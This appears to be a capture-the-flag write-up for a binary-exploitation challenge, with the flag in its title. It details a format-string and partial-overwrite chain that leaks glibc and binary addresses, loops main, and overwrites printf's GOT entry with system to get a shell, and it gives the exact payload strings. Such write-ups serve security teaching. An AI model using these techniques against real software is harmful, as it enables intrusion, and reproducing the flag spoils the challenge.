# huge binary 2 — K17{turn$_0ut_siz3_do3s_m@tter}

`python3 solve.py remote` (retries; ~1/16 per connection). `solve.py local` also works.

## Bug
`main` has an arbitrary rbp-relative **byte read** oracle (`scanf("%d",&idx)` →
`printf("...0x%x", *(u8*)(rbp+idx-1))`, idx is a signed int) plus **two uncontrolled
`printf`s** on `%31s` buffers. PIE/NX/Partial RELRO, no canary. Remote glibc 2.41.

`rsp == rbp-0x60` at both printf calls ⇒ `%N$ = [rbp-0x60+(N-6)*8]`, so
`%18$`=saved rbp, `%19$`=retaddr, and the `%53$` slot sits at `rbp+0x118`.

## Key facts (all verified against the live service)
* retaddr = `libc+0x29ca8`. `__libc_start_call_main` is the local func at `0x29c30`;
  `call rax`@`0x29ca6` invokes main.
* **Loop**: 1-byte partial overwrite `0xa8 → 0xa1` ⇒ `libc+0x29ca1` =
  `mov rax,[rsp+0x8]; call rax` re-calls main with identical rsp/rbp.
  That `call` **re-pushes the original retaddr, so the loop must be re-armed every
  iteration.**
* `%18$` is *not* a stack pointer: glibc 2.41's `__libc_start_main` does
  `push rbp; mov ebp,esi`, so main's saved rbp == argc == 1.
* The pointer to the `%53$` slot (=`argv_addr`=`rbp+0x118`) is **`%24$`** — the
  `rbx` saved in `__libc_start_call_main`'s `jmp_buf`. `setjmp` runs *before* the
  loop re-entry point, so `%24$` survives every iteration. (`%6$` is argv too but
  main rewrites it from a garbage `rsi` after looping; `%20$` is *not* argv at all.)
* Write chain: `%24$hn` re-aims `argv[0]`; `%53$hn` writes through it.
  `printf_positional` reads all args eagerly, so the re-aim only takes effect in the
  *next* printf.
* Bootstrap: oracle `idx=50` reads byte1 of `argv_addr` (`%24$` slot is at rbp+0x30)
  ⇒ exact `byte1(rbp)`; rbp is 16-aligned ⇒ 16 candidates for the low byte.
* one_gadget is unusable: after `leave`, rbp == 1.

## Chain — GOT overwrite (5 iterations, 2 writes/printf, 31-byte budget)
```
i1 b1: %19$p%24$p + %1$Nc + %24$hn     leak libc+argv; aim argv[0] -> &retaddr
i1 b2: %1$161c%53$hhn                  retaddr.b0 = 0xa1  -> LOOP
i2 b1: re-arm + aim argv[0] -> &slot(%41$)
i2 b2: %21$p%41$p%45$p                 leak chal base (%41$=chal+0x3dd8, %45$=chal+0x1080)
i3 b1: %53$hn -> [%41$slot].lo16 = GOT_printf      ; aim -> &retaddr
i3 b2: re-arm                                      ; aim -> &slot(%45$)
i4 b1: %53$hn -> [%45$slot].lo16 = GOT_printf+2    ; aim -> &retaddr
i4 b2: re-arm
i5 b1: %41$hn + %45$hn  => GOT[printf] (chal+0x4008) = system (libc+0x53110)
i5 b2: "sh"             => printf@plt dispatches to system("sh")  => shell
```
The 4-byte GOT write must be atomic inside **one** printf — a half-patched pointer
would be dispatched by the very next printf call.
